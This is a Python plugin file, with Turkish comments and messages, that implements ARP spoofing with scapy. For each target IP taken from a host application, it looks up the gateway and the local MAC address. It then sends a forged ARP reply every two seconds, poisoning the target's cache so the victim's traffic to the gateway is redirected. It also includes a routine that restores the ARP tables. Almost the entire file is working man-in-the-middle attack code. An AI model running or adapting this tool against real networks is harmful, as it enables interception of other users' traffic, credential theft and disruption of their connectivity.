# arp_spoof_plugin.py

import threading
from scapy.all import ARP, Ether, sendp, srp
import time
import netifaces
from mac_vendor_lookup import MacLookup
import sys  # sys modülünü ekledik

mac_lookup = MacLookup()
try:
    mac_lookup.update_vendors()
except Exception as e:
    print(f"MAC Vendor veritabanı güncellenemedi: {e}", file=sys.stderr)

class ARPSpoof:
    def __init__(self):
        self.threads = {}
        self.stop_events = {}
        self.lock = threading.Lock()  # Thread güvenliği için kilit ekledik

    def start_all(self, app_instance):
        gateway_ip = self.get_gateway_ip()
        iface = app_instance.get_interface()
        if not gateway_ip or not iface:
            app_instance.log_message("Gateway IP adresi veya ağ arayüzü bulunamadı. ARP spoofing başlatılamıyor.", 'red')
            return

        for target_ip in app_instance.targets:
            self.start(target_ip, gateway_ip, iface, app_instance)

    def stop_all(self, app_instance):
        gateway_ip = self.get_gateway_ip()
        iface = app_instance.get_interface()
        if not gateway_ip or not iface:
            app_instance.log_message("Gateway IP adresi veya ağ arayüzü bulunamadı. ARP spoofing durdurulamıyor.", 'red')
            return

        for target_ip in list(self.threads.keys()):
            self.stop(target_ip, gateway_ip, iface, app_instance)

    def start(self, target_ip, gateway_ip, iface, app_instance):
        if target_ip in self.threads:
            app_instance.log_message(f"{target_ip} için ARP spoofing zaten başlatılmış.", 'red')
            return

        stop_event = threading.Event()
        thread = threading.Thread(target=self.arp_spoof, args=(target_ip, gateway_ip, iface, stop_event, app_instance), daemon=True)
        self.threads[target_ip] = thread
        self.stop_events[target_ip] = stop_event
        thread.start()
        app_instance.log_message(f"ARP spoofing başlatıldı: {target_ip}", 'green')

    def stop(self, target_ip, gateway_ip, iface, app_instance):
        if target_ip in self.threads:
            self.stop_events[target_ip].set()
            self.threads.pop(target_ip)
            self.stop_events.pop(target_ip)
            self.restore_arp(target_ip, gateway_ip, iface, app_instance)
            app_instance.log_message(f"ARP spoofing durduruldu: {target_ip}", 'red')
        else:
            app_instance.log_message(f"{target_ip} için aktif ARP spoofing bulunamadı.", 'red')

    def arp_spoof(self, target_ip, gateway_ip, iface, stop_event, app_instance):
        try:
            target_mac = self.get_mac(target_ip)
            gateway_mac = self.get_mac(gateway_ip)
            my_mac = self.get_my_mac()

            if not target_mac or not gateway_mac or not my_mac:
                app_instance.log_message(f"Hedef veya gateway MAC adresi bulunamadı ({target_ip}).", 'red')
                return

            while not stop_event.is_set():
                # Sadece hedefe sahte ARP paketleri gönder (Gateway IP'sini kendi MAC adresimle eşleştir)
                arp_to_target = ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac, hwsrc=my_mac)
                ether_to_target = Ether(dst=target_mac)
                packet_to_target = ether_to_target / arp_to_target
                sendp(packet_to_target, iface=iface, verbose=0)

                app_instance.log_message(f"ARP spoof paketleri gönderildi: {target_ip} -> {gateway_ip}", 'green')
                time.sleep(2)
        except Exception as e:
            app_instance.log_message(f"ARP Spoofing Hatası ({target_ip}): {e}", 'red')

    def restore_arp(self, target_ip, gateway_ip, iface, app_instance):
        try:
            target_mac = self.get_mac(target_ip)
            gateway_mac = self.get_mac(gateway_ip)

            if not target_mac or not gateway_mac:
                app_instance.log_message(f"ARP geri yükleme için gerekli MAC adresleri bulunamadı ({target_ip}).", 'red')
                return

            # ARP tablolarını birkaç kez geri yüklemek daha güvenilir olabilir
            for _ in range(5):
                # Hedefe doğru ARP paketleri gönder (Gateway IP'sini gerçek MAC adresiyle eşleştir)
                arp_to_target = ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac, hwsrc=gateway_mac)
                ether_to_target = Ether(dst=target_mac)
                packet_to_target = ether_to_target / arp_to_target
                sendp(packet_to_target, iface=iface, verbose=0)

                time.sleep(1)  # Paketler arasında bekleme süresi

            app_instance.log_message(f"ARP tabloları geri yüklendi: {target_ip} -> {gateway_ip}", 'green')
        except Exception as e:
            app_instance.log_message(f"ARP Geri Yükleme Hatası ({target_ip}): {e}", 'red')

    def get_my_mac(self):
        try:
            local_ip = self.get_local_ip()
            interfaces = netifaces.interfaces()
            for iface in interfaces:
                addresses = netifaces.ifaddresses(iface)
                if netifaces.AF_LINK in addresses:
                    for link in addresses[netifaces.AF_LINK]:
                        mac = link.get('addr')
                        if mac and len(mac.split(':')) == 6:
                            # İlgili arayüzdeki IP'yi kontrol et
                            if netifaces.AF_INET in addresses:
                                for link_in in addresses[netifaces.AF_INET]:
                                    ip = link_in.get('addr')
                                    if ip == local_ip:
                                        return mac
            return None
        except Exception as e:
            print(f"Kendi MAC adresiniz alınamadı: {e}", file=sys.stderr)
            return None

    def get_mac(self, ip):
        try:
            arp_request = ARP(pdst=ip)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast / arp_request
            answered_list = srp(arp_request_broadcast, timeout=3, verbose=0)[0]
            if answered_list:
                return answered_list[0][1].hwsrc
            else:
                return None
        except Exception as e:
            print(f"MAC adresi alınırken hata oluştu: {e}", file=sys.stderr)
            return None

    def get_gateway_ip(self):
        try:
            gateways = netifaces.gateways()
            default_gateway = gateways.get('default')
            if default_gateway:
                return default_gateway.get(netifaces.AF_INET, [None])[0]
            else:
                return None
        except Exception as e:
            print(f"Gateway IP alınırken hata oluştu: {e}", file=sys.stderr)
            return None

    def get_local_ip(self):
        try:
            interfaces = netifaces.interfaces()
            for iface in interfaces:
                addresses = netifaces.ifaddresses(iface)
                if netifaces.AF_INET in addresses:
                    for link in addresses[netifaces.AF_INET]:
                        ip = link.get('addr')
                        if ip and not ip.startswith("127."):
                            return ip
            return "127.0.0.1"
        except Exception as e:
            print(f"Yerel IP alınırken hata oluştu: {e}", file=sys.stderr)
            return "127.0.0.1"

# ARP Spoofing Eklentisi Yükleme
def setup(app):
    arp_spoof_plugin = ARPSpoof()
    arp_spoof_plugin.filename = "arp_spoof_plugin.py"  # Eklenti dosya adını belirlemek için
    return arp_spoof_plugin
